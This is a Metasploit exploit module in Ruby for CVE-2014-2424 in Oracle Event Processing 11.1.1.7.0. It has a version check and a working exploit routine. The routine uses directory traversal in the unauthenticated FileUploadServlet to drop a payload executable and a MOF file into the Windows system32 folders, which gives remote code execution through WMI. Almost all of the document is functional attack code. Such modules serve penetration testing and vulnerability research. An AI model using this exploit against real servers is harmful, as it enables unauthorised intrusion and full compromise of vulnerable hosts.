##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Event Processing FileUploadServlet Arbitrary File Upload',
      'Description'    => %q{
        This module exploits an Arbitrary File Upload vulnerability in Oracle Event Processing
        11.1.1.7.0. The FileUploadServlet component, which requires no authentication, can be
        abused to upload a malicious file onto an arbitrary location due to a directory traversal
        flaw, and compromise the server. By default Oracle Event Processing uses a Jetty
        Application Server without JSP support, which limits the attack to WbemExec. The current
        WbemExec technique only requires arbitrary write to the file system, but at the moment the
        module only supports Windows 2003 SP2 or older.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-2424'],
          ['ZDI', '14-106'],
          ['BID', '66871'],
          ['URL', 'http://www.oracle.com/technetwork/topics/security/cpuapr2014-1972952.html']
        ],
      'DefaultOptions' =>
        {
          'WfsDelay' => 5
        },
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 2048
        },
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['Oracle Event Processing 11.1.1.7.0 / Windows 2003 SP2 through WMI', {}]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 21 2014'))

    register_options(
      [
        Opt::RPORT(9002),
        # By default, uploads are stored in:
        # C:\Oracle\Middleware\user_projects\domains\<DOMAIN>\defaultserver\upload\
        OptInt.new('DEPTH', [true, 'Traversal depth', 7])
      ], self.class)
  end

  def upload(file_name, contents)
    post_data = Rex::MIME::Message.new
    post_data.add_part(rand_text_alpha(4 + rand(4)), nil, nil, "form-data; name=\"Filename\"")
    post_data.add_part(contents, "application/octet-stream", "binary", "form-data; name=\"uploadfile\"; filename=\"#{file_name}\"")
    data = post_data.to_s

    res = send_request_cgi({
      'uri'    => '/wlevs/visualizer/upload',
      'method' => 'POST',
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'data'   => data
    })

    res
  end

  def traversal
    "../" * datastore['DEPTH']
  end

  def exploit
    print_status("#{peer} - Generating payload and mof file...")
    mof_name = "#{rand_text_alpha(rand(5)+5)}.mof"
    exe_name = "#{rand_text_alpha(rand(5)+5)}.exe"
    exe_content = generate_payload_exe
    mof_content = generate_mof(mof_name, exe_name)

    print_status("#{peer} - Uploading the exe payload #{exe_name}...")
    exe_traversal = "#{traversal}WINDOWS/system32/#{exe_name}"
    res = upload(exe_traversal, exe_content)

    unless res && res.code == 200 && res.body.blank?
      print_error("#{peer} - Unexpected answer, trying anyway...")
    end
    register_file_for_cleanup(exe_name)

    print_status("#{peer} - Uploading the MOF file #{mof_name}")
    mof_traversal = "#{traversal}WINDOWS/system32/wbem/mof/#{mof_name}"
    upload(mof_traversal, mof_content)
    register_file_for_cleanup("wbem/mof/good/#{mof_name}")
  end

  def check
    res = send_request_cgi({
      'uri'    => '/ohw/help/state',
      'method' => 'GET',
      'vars_get'  => {
        'navSetId' => 'cepvi',
        'navId' => '0',
        'destination' => ''
      }
    })

    if res && res.code == 200
      if res.body.to_s.include?("Oracle Event Processing 11g Release 1 (11.1.1.7.0)")
        return Exploit::CheckCode::Detected
      elsif res.body.to_s.include?("Oracle Event Processing 12")
        return Exploit::CheckCode::Safe
      end
    end

    Exploit::CheckCode::Unknown
  end

end

